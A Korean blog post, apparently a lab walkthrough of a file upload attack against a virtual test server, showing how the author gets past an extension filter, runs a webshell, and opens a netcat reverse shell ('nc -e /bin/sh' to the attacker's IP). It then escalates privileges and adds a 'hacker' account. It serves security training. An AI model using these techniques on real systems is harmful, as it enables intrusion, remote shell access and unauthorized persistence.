---
title: "파일업로드 공격 실습(File Upload Attack)"
categories:
  - Web
tags:
  - Web hacking
  - File upload
  - netcat
  - webshell
comments: true
---

파일 업로드 공격 취약점을 이용하여 서버의 root 권한을 획득하는 방법에 대해 기술한다.

> 1. 공격대상 서버 가상머신 환경설정
> 2. 파일 업로드 취약점 확인
> 3. Webshell 업로드 및 실행
> 4. nc 를 이용한 reverse connection
> 5. exploit code 재컴파일, 실행을 통한 권한상승


# 1. 공격대상 서버 가상머신 환경설정

VMware [Edit]-[Virtual Network Editor]-[VMnet8] 에서 다음과 같이 설정한다.
- Subnet IP : 10.10.10.0
- DHCP Settings - starting ip address : 10.10.10.5
- DHCP Settings - starting ip address : 10.10.10.254

<center><p><img src="/assets/2019-01-28-post-file_upload_attack/1.jpg"></p></center>

VMware NAT 방식에서 공격대상과 공격자 IP는 다음과 같다.
- 공격대상 서버의 IP : 10.10.10.10
- 공격자 PC 의 IP : 10.10.10.1


# 2. 파일 업로드 취약점 확인

파일 업로드 공격은 다음의 3가지를 충족해야 한다.
- 공격자가 원하는 파일이 업로드 가능해야 한다.(확장자 우회 등을 통해)
- 업로드된 파일의 경로(서버 내 경로)를 알아야 한다.
- 업로드된 파일의 실행권한

> 2.1. 공격대상 웹 게시판에 sher.jpg 파일 업로드

<center><p><img src="/assets/2019-01-28-post-file_upload_attack/2.1.png"></p></center>

<center><p><img src="/assets/2019-01-28-post-file_upload_attack/2.1.2.png"></p></center>

> 2.2. [이미지 우클릭]-[이미지 주소 복사] 를 통해 업로드된 파일의 경로를 파악한다.

파일 업로드 경로 : http://10.10.10.10/wizboard/table/root/board04/updir/sher.jpg

<center><p><img src="/assets/2019-01-28-post-file_upload_attack/2.2.png"></p></center>


# 3. Webshell 업로드 및 실행

> 3.1. shell.php 업로드를 하면 다음과 같이 블랙리스트 기반 파일 확장자 필터링이 있는 것을 알 수 있다.


<center><p><img src="/assets/2019-01-28-post-file_upload_attack/3.1.png"></p></center>


> 3.2. shell.php.kr 로 파일명을 변경한 후 업로드 재시도(파일 필터링 우회기법) : 성공

<center><p><img src="/assets/2019-01-28-post-file_upload_attack/3.2.png"></p></center>

> 3.3. Webshell 실행

<2.2. 파일 업로드 경로> 에서 알아낸 파일 업로드 경로를 참고하여 다음의 url 을 통해 webshell 을 실행시킨다.

http://10.10.10.10/wizboard/table/root/board04/updir/shell.php.kr

<center><p><img src="/assets/2019-01-28-post-file_upload_attack/3.3.png"></p></center>

> 3.4. 계정 확인 (명령어 : id)

**`nobody` 계정은 가장 권한이 낮은 계정 중 하나로, apache web server process를 구동시키기 위한 계정이다.**

<center><p><img src="/assets/2019-01-28-post-file_upload_attack/3.4.png"></p></center>

> 3.5. test 파일 생성 후 확인(명령어 : touch test, ls -al)

<center><p><img src="/assets/2019-01-28-post-file_upload_attack/3.5.png"></p></center>

> 3.6. test 파일 권한 확인(명령어 : stat test)

<center><p><img src="/assets/2019-01-28-post-file_upload_attack/3.6.png"></p></center>

> 3.7. exploit 코드 업로드 후, 실행을 통한 권한상승 시도

3.7.1. 게시판을 통한 exp1.c 업로드

<center><p><img src="/assets/2019-01-28-post-file_upload_attack/3.7.1.png"></p></center>

3.7.2. 컴파일 : gcc -o exp exp1.c

<center><p><img src="/assets/2019-01-28-post-file_upload_attack/3.7.2.png"></p></center>

3.7.3. 실행 : ./exp

<center><p><img src="/assets/2019-01-28-post-file_upload_attack/3.7.3.png"></p></center>

3.7.4. 권한 상승 실패로 여전히 nobody 계정이다.

<center><p><img src="/assets/2019-01-28-post-file_upload_attack/3.7.4.png"></p></center>


<div class="notice">
※ Expolit code 를 실행하였음에도, 권한상승에 실패한 이유?

웹쉘이란?  사실은 쉘이 아니다. 리눅스 쉘에 명령어를 전달하고 출력결과를 전달해주는 것으로 리눅스에서 쉘은 /bin/bash, /bin/sh 등이다. 실제 shell 을 통해 exploit 코드를 실행하여야 한다.
</div>


# 4. nc 를 이용한 reverse connection

> 4.1. 공격 대상 PC 에서 nc 프로그램을 연결대기 상태로 만든다.

cmd 창을 2개 생성 후 다음과 같이 명령어를 입력한다.<br>
`cmd_1` : nc -l -p 31337, 31337 포트를 이용한 프로그램 실행 중 상태 (31337 포트는 임의로 선택한 것이다.)<br>
`cmd_2` : netstat -an, 31337 포트가 리스팅 상태인지(프로그램이 제대로 실행되었는지) 확인

<center><p><img src="/assets/2019-01-28-post-file_upload_attack/4.1.jpg"></p></center>

> 4.2. 웹쉘을 통해 서버 -> 공격대상 PC 연결시킨다.

`웹쉘` : nc -e /bin/sh 10.10.10.1 31337 (이때, 10.10.10.1 은 공격자의 IP 주소이다.)<br>
`cmd_1` : id (연결확인)

<center><p><img src="/assets/2019-01-28-post-file_upload_attack/4.2.png"></p></center>

# 5. exploit code 재컴파일, 실행을 통한 권한상승

> 5.1. 이전에 컴파일 된, exp 를 삭제하고, nc(/bin/sh) 를 통해 exploit 코드를 재컴파일 후 실행시킨다.

<div class="notice">
※ root 권한의 계정으로 컴파일 된 실행파일을 만들기 위함
</div>

<center><p><img src="/assets/2019-01-28-post-file_upload_attack/5.1.jpg"></p></center>

> 5.2. hacker 계정 추가

```
useradd hacker<br>
passwd hacker<br>
cat /etc/passwd (hacker 계정 추가 확인)
```

<center><p><img src="/assets/2019-01-28-post-file_upload_attack/5.2.png"></p></center>

<br>

{% if page.comments %}

<div id="disqus_thread"></div>
<script>

/**
*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
/*
var disqus_config = function () {
this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};
*/
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://https-c0msherl0ck-github-io.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
                            
{% endif %}
